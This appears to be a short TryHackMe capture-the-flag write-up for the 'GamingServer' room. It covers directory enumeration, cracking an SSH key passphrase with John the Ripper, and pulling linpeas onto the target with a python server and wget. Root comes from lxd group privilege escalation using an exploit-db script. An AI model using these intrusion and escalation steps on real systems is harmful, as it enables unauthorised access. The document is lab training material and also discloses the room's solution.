# Writeup for GamingServer Room from TryHackMe
Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

## What is the user flag? What is the root flag?

We can do our basic enumerations with nmap, dirsearch , nikto and we found a webpage with these directories

```
[00:23:50] 200 -    2KB - /about.php
[00:24:31] 200 -    3KB - /index.html
[00:24:54] 200 -   33B  - /robots.txt
[00:24:55] 200 -  940B  - /secret/
[00:25:07] 200 -    1KB - /uploads/
```
Looking at all these directories we found a rsa id key , and a password list file.

We can use john the ripper and find the pass for the rsa id key.
```
~/Downloads/JohnTheRipper/run/ssh2john.py secretKey > johnhash
~/Downloads/JohnTheRipper/run/john johnhash --wordlist='dict.lst'
```
and we find the passphrase as ```letmein```.
And we can login and get the the user flag.

Now we can transfer linpeas to the victim pc using python server

we can do
```
python3 -m http.server
```
and from the victims pc we can wget it
```
wget "http"//localip:port/filename
```
Now running linpeas we can determine the possible vulnerabilities, We see that we can run lxd (container)
We can use lxd-alpine-builder, to generate .tar file. We use a exploit from [exploit](lxc_exploit) db exploitdb. We can transfer both .tar file and exploit through python server.

And we will run the exploit to make the container, the container will have the root folder mounted in the container. So now we can see the root.txt